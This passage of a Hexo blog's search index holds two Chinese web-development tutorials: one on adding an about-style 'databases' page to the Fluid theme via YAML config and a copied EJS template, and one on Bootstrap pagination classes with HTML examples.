<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>hexo-Fluid主题-创建仿关于（about）页面的步骤</title>
    <link href="/2021/08/18/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E5%88%9B%E5%BB%BA%E4%BB%BF%E5%85%B3%E4%BA%8E%EF%BC%88about%EF%BC%89%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%AD%A5%E9%AA%A4/"/>
    <url>/2021/08/18/%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/hexo-Fluid%E4%B8%BB%E9%A2%98-%E5%88%9B%E5%BB%BA%E4%BB%BF%E5%85%B3%E4%BA%8E%EF%BC%88about%EF%BC%89%E9%A1%B5%E9%9D%A2%E7%9A%84%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<p>创建类似于about页面的效果的方法步骤。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>本文以建一个资料库页面（databases）为例，页面效果类似与关于（about）页面。</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>利用hexo新建一个页面。输入以下命令。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">hexo new page databases<br></code></pre></div></td></tr></table></figure><p>在根目录下的<code>source</code> 文件夹中找到 <code>databases</code> 文件夹，并打开里面的index.md文件。</p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>在根目录下的<code>source</code> 文件夹中找到 <code>databases</code> 文件夹，并打开里面的index.md文件。<br>在头部里面添加以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">layout: databases <br>//此databases可以任取，但为方便管理，推荐这样取名。并且需要记住此名称，因为后面还需要用到。<br></code></pre></div></td></tr></table></figure><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>找到主题配置文件，注意，不是根目录的配置文件，是themes文件夹里面的配置文件，即你下载的主题里面的配置文件。</p><p>再在配置文件里面，找到类似的代码的地方。不一定和这个一模一样的，找到类似的代码的地方即可。如：友链页、自定义页、关于页、标签页、分类页、归档页等写配置的地方。</p><figure class="highlight yml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yml"><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 404页</span><br><span class="hljs-comment"># 404 Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-attr">page404:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">banner_img:</span> <span class="hljs-string">avter.png</span><br>  <span class="hljs-attr">banner_img_height:</span> <span class="hljs-number">85</span><br>  <span class="hljs-attr">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-attr">subtitle:</span> <span class="hljs-string">&quot;Page not found&quot;</span><br><br></code></pre></div></td></tr></table></figure><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>添加页面配置代码。根据以下代码可以自行修改，或者是根据关于（about）的配置代码进行修改。<br><strong>注意：这里的databases就是在index.md里面写的那个名称。</strong></p><figure class="highlight yml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yml"><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 资料库</span><br><span class="hljs-comment"># databases Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-attr">databases:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">banner_img:</span> <span class="hljs-string">avter.png</span><br>  <span class="hljs-attr">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-attr">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-attr">subtitle:</span> <span class="hljs-string">资料库</span> <span class="hljs-comment"># 打字机内容,即页面显示的内容</span><br><br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># 关于页</span><br><span class="hljs-comment"># About Page</span><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-attr">about:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">banner_img:</span> <span class="hljs-string">avter.png</span><br>  <span class="hljs-attr">banner_img_height:</span> <span class="hljs-number">60</span><br>  <span class="hljs-attr">banner_mask_alpha:</span> <span class="hljs-number">0.3</span><br>  <span class="hljs-attr">subtitle:</span> <span class="hljs-string">关于写者</span> <span class="hljs-comment"># 打字机内容</span><br>  <span class="hljs-attr">avatar:</span> <span class="hljs-string">avter.png</span> <span class="hljs-comment"># 头像图片</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">&quot;墨水的记忆&quot;</span><br>  <span class="hljs-attr">introduce:</span> <span class="hljs-string">&quot;青春是用来奋斗的。如果有理想，就努力去实现T。&quot;</span><br>  <span class="hljs-attr">icons:</span><br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&quot;iconfont icon-qq-fill&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&quot;顽强&quot;</span> &#125;<br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&quot;iconfont icon-wechat-fill&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&quot;拼搏&quot;</span> &#125;<br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&quot;iconfont icon-alipay-fill&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&quot;奋斗&quot;</span> &#125;<br>    <span class="hljs-bullet">-</span> &#123; <span class="hljs-attr">class:</span> <span class="hljs-string">&quot;iconfont icon-map&quot;</span>, <span class="hljs-attr">link:</span> <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-attr">tip:</span> <span class="hljs-string">&quot;坚持&quot;</span> &#125;<br><br><br></code></pre></div></td></tr></table></figure><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h2><p>这也是最重要的一步。添加文件。在主题目录（themes文件夹）下，打开自己的主题文件夹，找到 <code>layout</code> 文件夹，再在里面找到 <code>about.ejs</code> 文件（根据自行的配置，找对应的文件）。复制一份，并将其命名为 <code>databases.ejs</code> （名称即在第四步中的那个名称）。</p><h2 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h2><p>修改刚复制好的文件里面的代码。</p><p>首先，这是被复制的文件的代码（根据自行的配置，所选的文件不同，代码可能不同），即 <code>about.ejs</code> 文件的代码：</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ejs">&lt;%<br>page.layout &#x3D; &quot;about&quot;<br>page.title &#x3D; theme.about.title || __(&#39;about.title&#39;)<br>page.subtitle &#x3D; theme.about.subtitle || __(&#39;about.subtitle&#39;)<br>page.banner_img &#x3D; theme.about.banner_img<br>page.banner_img_height &#x3D; theme.about.banner_img_height<br>page.banner_mask_alpha &#x3D; theme.about.banner_mask_alpha<br>%&gt;<br><br>&lt;div class&#x3D;&quot;text-center&quot;&gt;<br>  &lt;div class&#x3D;&quot;about-info&quot;&gt;<br>    &lt;div class&#x3D;&quot;about-name&quot;&gt;&lt;%- theme.about.name %&gt;&lt;&#x2F;div&gt;<br>    &lt;div class&#x3D;&quot;about-intro&quot;&gt;&lt;%- theme.about.introduce %&gt;&lt;&#x2F;div&gt;<br>    &lt;div class&#x3D;&quot;about-icons&quot;&gt;<br>      &lt;% for(const each of theme.about.icons || []) &#123; %&gt;<br>        &lt;% if (!each.class) continue; %&gt;<br>        &lt;% var cls &#x3D; each.class %&gt;<br>        &lt;% var isQr &#x3D; each.qrcode %&gt;<br>        &lt;a href&#x3D;&quot;&lt;%&#x3D; isQr ? &#39;javascript:;&#39; : url_for(each.link) %&gt;&quot; class&#x3D;&quot;&lt;%&#x3D; isQr ? &#39;qr-trigger&#39; : &#39;&#39; %&gt;<br>           &lt;%&#x3D; !isQr &amp;&amp; each.tip ? &#39;hint--bottom hint--rounded&#39; : &#39;&#39; %&gt;&quot;<br>           &lt;%&#x3D; !isQr &amp;&amp; each.tip ? &#39;aria-label&#x3D;&#39; + each.tip : &#39;&#39; %&gt;<br>        &gt;<br>          &lt;i class&#x3D;&quot;&lt;%&#x3D; cls %&gt;&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;<br>          &lt;% if (isQr) &#123; %&gt;<br>            &lt;img class&#x3D;&quot;qr-img&quot; src&#x3D;&quot;&lt;%&#x3D; url_for(each.qrcode) %&gt;&quot; alt&#x3D;&quot;qrcode&quot; &#x2F;&gt;<br>          &lt;% &#125; %&gt;<br>        &lt;&#x2F;a&gt;<br>      &lt;% &#125; %&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;div&gt;<br><br>&lt;article class&#x3D;&quot;about-content mt-5&quot;&gt;<br>  &lt;div class&#x3D;&quot;markdown-body&quot;&gt;<br>    &lt;%- page.content %&gt;<br>  &lt;&#x2F;div&gt;<br><br>  &lt;% if(page.comments) &#123; %&gt;<br>    &lt;!-- Comments --&gt;<br>    &lt;article class&#x3D;&quot;comments&quot; id&#x3D;&quot;comments&quot;&gt;<br>      &lt;% var type %&gt;<br>      &lt;% if (typeof page.comment &#x3D;&#x3D;&#x3D; &#39;string&#39; &amp;&amp; page.comment !&#x3D;&#x3D; &#39;&#39;) &#123; %&gt;<br>        &lt;% type &#x3D; &#39;_partial&#x2F;comments&#x2F;&#39; + page.comment %&gt;<br>      &lt;% &#125; else &#123; %&gt;<br>        &lt;% type &#x3D; &#39;_partial&#x2F;comments&#x2F;&#39; + theme.post.comments.type %&gt;<br>      &lt;% &#125; %&gt;<br>      &lt;%- partial(type) %&gt;<br>    &lt;&#x2F;article&gt;<br>  &lt;% &#125; %&gt;<br>&lt;&#x2F;article&gt;<br><br></code></pre></div></td></tr></table></figure><p>然后修改，其实就只是修改了第三行的代码，其他的都没有改变。将第三行代码原来的 about 改为了 databases 而已。这个名称就是第四步里面的名称。</p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ejs">&lt;%<br>page.layout &#x3D; &quot;about&quot;<br>page.title &#x3D; theme.about.title || __(&#39;about.title&#39;)<br>page.subtitle &#x3D; theme.databases.subtitle || __(&#39;databases.subtitle&#39;)<br>page.banner_img &#x3D; theme.about.banner_img<br>page.banner_img_height &#x3D; theme.about.banner_img_height<br>page.banner_mask_alpha &#x3D; theme.about.banner_mask_alpha<br>%&gt;<br><br>&lt;div class&#x3D;&quot;text-center&quot;&gt;<br>  &lt;div class&#x3D;&quot;about-info&quot;&gt;<br>    &lt;div class&#x3D;&quot;about-name&quot;&gt;&lt;%- theme.about.name %&gt;&lt;&#x2F;div&gt;<br>    &lt;div class&#x3D;&quot;about-intro&quot;&gt;&lt;%- theme.about.introduce %&gt;&lt;&#x2F;div&gt;<br>    &lt;div class&#x3D;&quot;about-icons&quot;&gt;<br>      &lt;% for(const each of theme.about.icons || []) &#123; %&gt;<br>        &lt;% if (!each.class) continue; %&gt;<br>        &lt;% var cls &#x3D; each.class %&gt;<br>        &lt;% var isQr &#x3D; each.qrcode %&gt;<br>        &lt;a href&#x3D;&quot;&lt;%&#x3D; isQr ? &#39;javascript:;&#39; : url_for(each.link) %&gt;&quot; class&#x3D;&quot;&lt;%&#x3D; isQr ? &#39;qr-trigger&#39; : &#39;&#39; %&gt;<br>           &lt;%&#x3D; !isQr &amp;&amp; each.tip ? &#39;hint--bottom hint--rounded&#39; : &#39;&#39; %&gt;&quot;<br>           &lt;%&#x3D; !isQr &amp;&amp; each.tip ? &#39;aria-label&#x3D;&#39; + each.tip : &#39;&#39; %&gt;<br>        &gt;<br>          &lt;i class&#x3D;&quot;&lt;%&#x3D; cls %&gt;&quot; aria-hidden&#x3D;&quot;true&quot;&gt;&lt;&#x2F;i&gt;<br>          &lt;% if (isQr) &#123; %&gt;<br>            &lt;img class&#x3D;&quot;qr-img&quot; src&#x3D;&quot;&lt;%&#x3D; url_for(each.qrcode) %&gt;&quot; alt&#x3D;&quot;qrcode&quot; &#x2F;&gt;<br>          &lt;% &#125; %&gt;<br>        &lt;&#x2F;a&gt;<br>      &lt;% &#125; %&gt;<br>    &lt;&#x2F;div&gt;<br>  &lt;&#x2F;div&gt;<br>&lt;&#x2F;div&gt;<br><br>&lt;article class&#x3D;&quot;about-content mt-5&quot;&gt;<br>  &lt;div class&#x3D;&quot;markdown-body&quot;&gt;<br>    &lt;%- page.content %&gt;<br>  &lt;&#x2F;div&gt;<br><br>  &lt;% if(page.comments) &#123; %&gt;<br>    &lt;!-- Comments --&gt;<br>    &lt;article class&#x3D;&quot;comments&quot; id&#x3D;&quot;comments&quot;&gt;<br>      &lt;% var type %&gt;<br>      &lt;% if (typeof page.comment &#x3D;&#x3D;&#x3D; &#39;string&#39; &amp;&amp; page.comment !&#x3D;&#x3D; &#39;&#39;) &#123; %&gt;<br>        &lt;% type &#x3D; &#39;_partial&#x2F;comments&#x2F;&#39; + page.comment %&gt;<br>      &lt;% &#125; else &#123; %&gt;<br>        &lt;% type &#x3D; &#39;_partial&#x2F;comments&#x2F;&#39; + theme.post.comments.type %&gt;<br>      &lt;% &#125; %&gt;<br>      &lt;%- partial(type) %&gt;<br>    &lt;&#x2F;article&gt;<br>  &lt;% &#125; %&gt;<br>&lt;&#x2F;article&gt;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习教程</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（二十二）BootStrap-组件(三)</title>
    <link href="/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%89BootStrap-%E7%BB%84%E4%BB%B6(%E4%B8%89)/"/>
    <url>/2021/08/18/JavaWEB/JavaWEB-%EF%BC%88%E4%BA%8C%E5%8D%81%E4%BA%8C%EF%BC%89BootStrap-%E7%BB%84%E4%BB%B6(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<p>Bootstrap 是最受欢迎的 HTML、CSS 和 JS 框架，用于开发响应式布局、移动设备优先的 WEB 项目。Bootstrap是基于HTML、CSS、JavaScript 开发的简洁、直观、强悍的前端开发框架，使得 Web 开发更加快捷。提供了优雅的HTML和CSS规范。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-分页"><a href="#1-分页" class="headerlink" title="1.分页"></a>1.分页</h2><table><thead><tr><th align="left">类</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">.pager</td><td align="left">一个简单的分页链接，链接居中对齐。</td></tr><tr><td align="left">.previous</td><td align="left">.pager 中上一页的按钮样式，左对齐</td></tr><tr><td align="left">.next</td><td align="left">.pager 中下一页的按钮样式，右对齐</td></tr><tr><td align="left">.disabled</td><td align="left">禁用链接</td></tr><tr><td align="left">.pagination</td><td align="left">分页链接</td></tr><tr><td align="left">.pagination-lg</td><td align="left">更大尺寸的分页链接</td></tr><tr><td align="left">.pagination-sm</td><td align="left">更小尺寸的分页链接</td></tr><tr><td align="left">.disabled</td><td align="left">禁用链接</td></tr><tr><td align="left">.active</td><td align="left">当前访问页面链接样式</td></tr></tbody></table><h3 id="1-1-基本分页"><a href="#1-1-基本分页" class="headerlink" title="1.1 基本分页"></a>1.1 基本分页</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pagination&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;laquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;raquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-禁用和激活状态"><a href="#1-2-禁用和激活状态" class="headerlink" title="1.2 禁用和激活状态"></a>1.2 禁用和激活状态</h3><p>链接在不同情况下可以定制。可以给不能点击的链接添加 <code>.disabled</code> 类、给当前页添加 <code>.active</code> 类。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pagination&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;laquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;active&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;disabled&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;raquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-尺寸"><a href="#1-3-尺寸" class="headerlink" title="1.3 尺寸"></a>1.3 尺寸</h3><p><code>.pagination-lg</code> 或 <code>.pagination-sm</code> 类提供了额外可供选择的尺寸。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;pagination pagination-lg&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-symbol">&amp;laquo;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span 